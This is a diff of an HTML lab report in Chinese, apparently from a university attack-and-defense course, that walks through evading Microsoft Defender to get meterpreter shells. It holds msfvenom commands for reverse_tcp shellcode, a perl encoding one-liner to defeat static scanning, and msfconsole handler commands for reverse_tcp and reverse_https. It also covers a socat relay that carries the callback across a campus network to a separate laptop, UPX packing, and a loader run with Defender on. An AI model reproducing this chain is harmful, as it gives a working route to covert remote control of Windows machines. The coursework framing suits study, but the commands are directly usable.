-<pre data-lang="powershell"><code># Windows：建议在 cmd 里前台运行——loader 用相对路径读 encoded.txt，务必先 cd 到两文件所在目录；
+msfconsole -q -r 你的学号_handler.rc</code></pre></div>
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="powershell"><code># Windows：建议在 cmd 里前台运行——loader 用相对路径读 encoded.txt，务必先 cd 到两文件所在目录；
 # 双击通常也能跑（资源管理器会把工作目录设为 exe 所在目录），但排查问题时看不到报错
 cd D:\网络攻防\exp3\你的学号    # A 用共享文件夹路径；走 socat 传输的读者 cd 到你解包的目录（如 C:\你的学号lab3）
-.\你的学号_loader.exe</code></pre>
+.\你的学号_loader.exe</code></pre></div>
 <p>Defender 实时保护全程开启的状态下，meterpreter 会话成功建立：stage 199238 字节，<code>sysinfo</code> 确认 Windows 11 24H2（Build 26200）、<code>getuid</code> 为 SILENCEWANG\ASUS；任务管理器里 loader（32 位）作为后台进程安静地跑着，只占 2.5 MB 内存。</p>
 <figure><img src="img/fig16.png" alt="图16 A 环境：任务管理器可见 20242110_load"><figcaption>图16 A 环境：任务管理器可见 20242110_loader.exe（32 位）后台进程；Kali 侧 meterpreter 会话 sysinfo/getuid 确认目标</figcaption></figure>
 <h3><span class="hn">（一）</span>踩坑实录：loader 秒退、handler 迟迟无会话</h3>
@@ -401,24 +414,24 @@ cd D:\网络攻防\exp3\你的学号    # A 用共享文件夹路径；走 socat
 <p>值得强调的是：<strong>A 环境的 reverse_tcp 成功了，B 环境的 reverse_tcp 被拦杀</strong>——行为检测存在概率性（云查杀判定随时间与环境而变）。这组对照恰恰说明两件事：想<strong>稳定</strong>复现，就换掉传输层；而“静态免杀 ≠ 运行时免杀”这条底线，两种结果都成立。</p>
 <h2 id="sec11"><span class="hn">十一、</span>加壳版加载器的运行层验证（B 环境）</h2>
 <p>UPX 一节只验证了静态层，这里补运行层：换 x64 的 reverse_https handler，直接运行加壳版加载器，检验“压缩 + 模块踩踏执行”在壳内是否功能完好、是否会引入新的行为特征。</p>
-<pre data-lang="bash"><code>msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 你的Kali_IP; set LPORT 443; run&quot;</code></pre>
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="bash"><code>msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 你的Kali_IP; set LPORT 443; run&quot;</code></pre></div>
 <figure><img src="img/fig19.png" alt="图19 B 环境：Staging x64 payload（2"><figcaption>图19 B 环境：Staging x64 payload（255868 字节），session 1 opened，getuid 确认权限——UPX 加壳未破坏加载器功能，也未触发行为拦截</figcaption></figure>
 <p>UPX 环节完整闭环：<strong>压缩至原体积的 52.14% → 静态 0 威胁（图15）→ 运行回连正常</strong>。</p>
 <h2 id="sec12"><span class="hn">十二、</span>进阶附加题：跨网段实测另一台电脑</h2>
 <p>前面的靶机都与攻击机同处一个 NAT 网段。真实场景里目标往往在<strong>另一个网络</strong>——附加题把整条链路搬到校园网：靶机是一台独立的 Windows 11 笔记本（Legion Y7000 IRX9，主机名 LH754168，校园网 WLAN <code>10.30.5.38</code>，Defender 实时保护开启、特征库最新），它<strong>无法直接路由</strong>到 Kali 的 NAT 网段（192.168.42.128）。</p>
 <h3><span class="hn">（一）</span>搭转发链路：让 443 端口“搬”到校园网地址上</h3>
 <p>在 A 的 Windows 主机（校园网地址 <code>10.30.43.151</code>）上用 socat 监听 443、把流量转发给 Kali（端口跟随你为 payload 选的 LPORT，不必是 443。<code>netsh interface portproxy</code> 的等价写法我们实测未能转发成功，故只保留验证过的 socat）：</p>
-<pre data-lang="powershell"><code># 首次监听时 Windows 防火墙会弹窗，选“允许”；若下文的可达性预检不通，先检查入站规则是否放行了该端口
-.\socat.exe TCP-LISTEN:443,fork,reuseaddr TCP:你的Kali_IP:443</code></pre>
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="powershell"><code># 首次监听时 Windows 防火墙会弹窗，选“允许”；若下文的可达性预检不通，先检查入站规则是否放行了该端口
+.\socat.exe TCP-LISTEN:443,fork,reuseaddr TCP:你的Kali_IP:443</code></pre></div>
 <figure><img src="img/fig20.png" alt="图20 A 环境：主机上运行 socat 把 443 端口流"><figcaption>图20 A 环境：主机上运行 socat 把 443 端口流量转发给 Kali（第一次直接敲 socat.exe 被 PowerShell 拒绝，加 .\ 前缀解决——又是个实测小坑）</figcaption></figure>
 <h3><span class="hn">（二）</span>生成“专属 payload”并预检可达性</h3>
 <p>回连地址必须是<strong>对方可达的地址</strong>——转发主机的校园网地址 <code>10.30.43.151</code>，重新生成一份加密载荷：</p>
-<pre data-lang="bash"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=你的转发主机IP LPORT=443 -f raw -o sc_net.raw
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="bash"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=你的转发主机IP LPORT=443 -f raw -o sc_net.raw
 perl -e &#x27;binmode STDIN; binmode STDOUT; while (read(STDIN,$b,1)) { printf &quot;%02x&quot;, (ord($b)+1) % 256 }&#x27; &lt; sc_net.raw &gt; encoded_net.txt
-wc -c sc_net.raw encoded_net.txt    # 355 / 710，×2 校验通过</code></pre>
+wc -c sc_net.raw encoded_net.txt    # 355 / 710，×2 校验通过</code></pre></div>
 <figure><img src="img/fig21.png" alt="图21 A 环境：LHOST=10.30.43.151 的专"><figcaption>图21 A 环境：LHOST=10.30.43.151 的专属载荷生成（左），资源管理器确认 encoded_net.txt 为 710 字节（右）</figcaption></figure>
 <p>对方电脑先做可达性预检（避免白跑一趟）：</p>
-<pre data-lang="powershell"><code>Test-NetConnection 你的转发主机IP -Port 443     # TcpTestSucceeded : True 即链路已通</code></pre>
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="powershell"><code>Test-NetConnection 你的转发主机IP -Port 443     # TcpTestSucceeded : True 即链路已通</code></pre></div>
 <figure><img src="img/fig22.png" alt="图22 A 环境：对方电脑可达性预检，TcpTestSucc"><figcaption>图22 A 环境：对方电脑可达性预检，TcpTestSucceeded: True</figcaption></figure>
 <h3><span class="hn">（三）</span>杀软开启下的回连实测</h3>
 <p>对方电脑的 Defender 状态：病毒和威胁防护开启、安全智能最新（2026/9/30 9:51）、最近一次快速扫描 32853 个文件未发现威胁——loader 与加密文本落地<strong>未检出</strong>。</p>
@@ -497,4 +510,39 @@ wc -c sc_net.raw encoded_net.txt    # 355 / 710，×2 校验通过</code></pre>
 <blockquote><strong>环境与版本备忘</strong>：Kali Linux 2026.2 / Metasploit（msfvenom、msfconsole）/ mingw-w64 交叉编译 / UPX 4.2.4 / socat 1.8.1.1 / Microsoft Defender（AMProductVersion 4.18.26080.4，特征库 1.459.501.0）/ Windows 11 24H2+（内核 10.0.26100、Build 26200）。</blockquote>
 <p>&gt;</p>
 <blockquote><strong>分工说明</strong>：<strong>A（20242110）</strong>完成五级演进全部实测（图1～8、14、16～17）与跨网段附加题（图20～24），并提供最小可用版加载器；<strong>B（20242217）</strong>完成模块踩踏版加载器与 x64 变体（图9）、UPX 闭环（图10、19）、tar+socat+MD5 传输链（图11～13）、三文件扫描复核（图15）、reverse_https 行为层实测（图18），以及图1/2/3/8 的 B 侧同阶段对照（滑动对比的②③张）。转载请注明出处。</blockquote>
-</div></body></html>
+</div>
+<div id="lightbox"><img id="lbimg" alt=""><div class="tip">双击图片或按 Esc / 点击空白处关闭</div></div>
+<script>
+(function(){
+  document.querySelectorAll('.copybtn').forEach(function(btn){
+    btn.addEventListener('click', function(){
+      var code = btn.parentElement.querySelector('pre code').innerText;
+      (navigator.clipboard ? navigator.clipboard.writeText(code) : Promise.reject())
+        .then(function(){ ok(); })
+        .catch(function(){
+          var ta = document.createElement('textarea'); ta.value = code;
+          ta.style.position = 'fixed'; ta.style.opacity = '0';
+          document.body.appendChild(ta); ta.select();
+          try { document.execCommand('copy'); ok(); } catch(e) {}
+          document.body.removeChild(ta);
+        });
+      function ok(){ btn.textContent = '已复制'; btn.classList.add('ok');
+        setTimeout(function(){ btn.textContent = '复制'; btn.classList.remove('ok'); }, 1600); }
+    });
+  });
+  var lb = document.getElementById('lightbox'), lbimg = document.getElementById('lbimg');
+  document.querySelectorAll('.wrap figure img').forEach(function(img){
+    img.style.cursor = 'zoom-in';
+    img.addEventListener('dblclick', function(e){
+      e.preventDefault();
+      lbimg.src = img.currentSrc || img.src;
+      lb.classList.add('on');
+    });
+  });
+  lb.addEventListener('dblclick', close);
+  lb.addEventListener('click', close);
+  document.addEventListener('keydown', function(e){ if(e.key === 'Escape') close(); });
+  function close(){ lb.classList.remove('on'); }
+})();
+</script>
+</body></html>
